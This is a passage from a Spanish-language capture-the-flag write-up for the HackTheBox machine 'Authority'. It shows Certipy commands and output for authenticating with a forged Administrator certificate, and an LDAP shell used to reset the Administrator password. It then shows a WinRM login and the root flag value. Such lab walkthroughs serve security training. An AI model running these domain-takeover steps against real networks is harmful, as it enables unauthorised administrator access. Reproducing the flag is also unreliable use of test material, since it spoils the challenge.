[*] Got certificate with UPN 'Administrator@authority.htb'
[+] Found SID in SAN URL: 'S-1-5-21-622327497-3269355298-2248959698-500'
[+] Found SID in security extension: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Certificate object SID is 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Concluyo el ataque obteniendo el archivo `administrator.pfx`.

```shell
❯ certipy-ad -debug auth -pfx administrator.pfx -username 'Administrator' -domain authority.htb -dc-ip 10.129.229.56
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.129.229.56'
[+] DC IP: '10.129.229.56'
[+] DC Host: ''
[+] Target IP: '10.129.229.56'
[+] Remote Name: '10.129.229.56'
[+] Domain: ''
[+] Username: 'ADMINISTRATOR'
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[+] Found SID in SAN URL: 'S-1-5-21-622327497-3269355298-2248959698-500'
[+] Found SID in security extension: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC authority.htb (10.129.229.56)
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/certipy/commands/auth.py", line 596, in kerberos_authentication
    tgt = sendReceive(as_req, domain, self.target.target_ip)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] See the wiki for more information
```

Me arroja otro error: impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type), buscando el error en Google, me sugiere nuevamente este repositorio:

[https://github.com/ly4k/Certipy/issues/205](https://github.com/ly4k/Certipy/issues/205)

Aconsejan implementar el parametro "-ldap-shell" para ingresar a una shell interactiva dentro de LDAP, debido a que cuento con privilegios de Administrador me permite cambiar la contraseña del propio Administrador.

```shell
❯ certipy-ad -debug auth -pfx administrator.pfx -username 'Administrator' -domain authority.htb -dc-ip 10.129.229.56 -ldap-shell
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.129.229.56'
[+] DC IP: '10.129.229.56'
[+] DC Host: ''
[+] Target IP: '10.129.229.56'
[+] Remote Name: '10.129.229.56'
[+] Domain: ''
[+] Username: 'ADMINISTRATOR'
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[+] Authenticating to LDAP server using Schannel authentication
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\\\Administrator'
[+] Bound to ldaps://10.129.229.56:636 - ssl
[+] Default path: DC=authority,DC=htb
[+] Configuration path: CN=Configuration,DC=authority,DC=htb
Type help for list of commands

# change_password Administrator Password123!
Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
Attempting to set new password of: Password123!
Password changed successfully!
```

Cambiada la constraseña, puedo acceder de nuevo al sistema como Administrador a travez de WinRM.
Comprobaré que se haya aplicado mi cambio de contraseña.

```shell
❯ netexec winrm authority.htb.corp -u 'Administrator' -p 'Password123!'
WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\\Administrator:Password123! (Pwn3d!)
```


```shell
❯ evil-winrm-py -i authority.htb.corp -u 'Administrator' -p 'Password123!'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\\ V | | |___\\ V  V | | ' \\| '_| '  |___| '_ | || |
 \\___|\\_/|_|_|    \\_/\\_/|_|_||_|_| |_|_|_|  | .__/\\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'authority.htb.corp:5985' as 'Administrator'
evil-winrm-py PS C:\\Users\\Administrator\\Documents> whoami
htb\\administrator
```

En el Escritorio de Administrador se encuentra la root flag.

```shell
evil-winrm-py PS C:\\Users\\Administrator> cd Desktop
evil-winrm-py PS C:\\Users\\Administrator\\Desktop> ls

    Directory: C:\\Users\\Administrator\\Desktop

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-ar---       12/28/2025   7:18 PM             34 root.txt                                                               

evil-winrm-py PS C:\\Users\\Administrator\\Desktop> type root.txt
3105159f7e471dcc3ce3237cff3efd89
```

> Administrator Flag: 3105159f7e471dcc3ce3237cff3efd89
